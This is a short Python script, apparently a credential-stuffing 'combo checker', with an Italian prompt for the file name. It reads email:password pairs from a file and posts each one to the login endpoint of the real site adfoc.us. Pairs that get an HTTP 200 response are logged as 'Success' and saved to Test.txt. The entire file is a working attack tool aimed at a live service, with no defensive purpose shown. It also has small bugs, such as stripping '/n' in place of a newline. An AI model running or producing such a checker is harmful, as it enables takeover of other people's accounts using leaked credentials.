import requests



def failed(email, password, status):

    print(f"Failed: {email}:{password}")



def passed(email, password):

    print(f"Success: {email}:{password}")

    print(f"{email}:{password}", file=open("Test.txt", "w"))



def checker(data):

    email = data[0]

    password = data[1]

    success_key = """<strong>Referral Program:</strong>"""

    api_sender = requests.session()

    response = api_sender.post("http://adfoc.us/session/create", data={"email": email,
                                                                    "password": password})

    print(response, file=open("response.txt", "w"))

    status = response.status_code

    print(status, file=open("status.txt", "w"))

    if status == 200:
        passed(email, password)
    else:
        failed(email, password, status)



nome_combo = input("Inserire il nome del file: ")

combo = open(nome_combo, "r").readlines()

arrange = [lines.replace("/n", "")for lines in combo]

for lines in arrange:

    data = lines.split(":")

    checker(data)
